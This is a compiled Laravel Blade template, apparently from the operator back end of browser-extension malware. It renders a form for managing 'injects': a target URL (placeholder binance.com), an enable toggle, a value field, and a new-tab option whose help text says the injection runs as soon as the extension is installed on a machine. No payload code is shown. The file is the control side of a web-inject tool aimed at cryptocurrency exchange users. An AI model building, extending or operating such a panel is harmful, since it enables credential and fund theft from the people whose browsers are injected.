

<?php $__env->startSection('content'); ?>
    <div class="content-wrapper">
        <div class="container-fluid flex-grow-1 container-p-y">
            <div class="row">
                <div class="col-xl">
                    <div class="card mb-4">
                        <div class="card-header d-flex justify-content-between align-items-center">
                            <h5 class="mb-0"><?php if(isset($item)): ?>
                                    Edit
                                <?php else: ?>
                                    New
                                <?php endif; ?> Inject</h5>
                        </div>
                        <div class="card-body">
                            <form action="<?php echo e(route('injects.create.action')); ?>" method="POST">
                                <?php if(isset($item)): ?>
                                    <input type="text" class="form-control" name="id" value="<?php echo e($item->id); ?>" hidden/>
                                <?php endif; ?>

                                <div class="mb-3">
                                    <label class="form-label" for="url">Url</label>
                                    <input type="text" class="form-control" name="url" id="url"
                                           placeholder="binance.com"
                                           <?php if(isset($item)): ?> value="<?php echo e($item->url); ?>" <?php endif; ?> />
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="status">Status</label>
                                    <select class="select2 form-select" name="is_enabled">
                                        <option <?php if(isset($item) && $item->is_enabled): ?> selected <?php endif; ?> value="1">
                                            Enable
                                        </option>
                                        <option <?php if(isset($item) && !$item->is_enabled): ?> selected <?php endif; ?> value="0">
                                            Disable
                                        </option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="status">Open in new tab</label>
                                    <select class="select2 form-select" name="is_new_tab">
                                        <option <?php if(isset($item) && $item->is_new_tab): ?> selected <?php endif; ?> value="1">
                                            Yes
                                        </option>
                                        <option <?php if(isset($item) && !$item->is_new_tab): ?> selected <?php endif; ?> value="0">
                                            No
                                        </option>
                                    </select>
                                    <div class="form-text">Each time you install the extension and update the information about the machine, a new tab will open and the injection will immediately work.</div>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="value">Value</label>
                                    <textarea
                                        id="value"
                                        name="value"
                                        class="form-control"
                                        placeholder=""
                                    ><?php if(isset($item)): ?>
                                            <?php echo e($item->value); ?>

                                        <?php endif; ?></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary"><?php if(isset($item)): ?>
                                        Edit
                                    <?php else: ?>
                                        Create
                                    <?php endif; ?></button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php $__env->stopSection(); ?>

<?php echo $__env->make('pages.layout', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH C:\OSPanel\domains\friezer-backend\resources\views/pages/injects/item.blade.php ENDPATH**/ ?>